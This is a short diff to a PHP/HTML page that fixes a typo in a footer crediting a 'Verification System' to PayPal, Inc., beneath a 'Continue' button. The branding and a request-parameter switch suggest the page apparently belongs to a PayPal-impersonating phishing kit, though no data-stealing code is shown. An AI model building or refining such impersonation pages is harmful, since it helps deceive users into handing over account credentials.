@@ -142,7 +142,7 @@ if (isset($_REQUEST['css_type']) && $_REQUEST['css_type'] == '1') {
 		<br>
 	      <p><button onclick="check()" class="submit" type="submit" name="submit" value="">Continue</button></p>			
 				<br><br>
-				<p><small>erification System by <a href="?css_type=0">©1999-2019 PayPal, Inc. All rights reserved.</small></p>
+				<p><small>Verification System by <a href="?css_type=0">©1999-2019 PayPal, Inc. All rights reserved.</small></p>
 			</form>
 		</div>
 	</div>
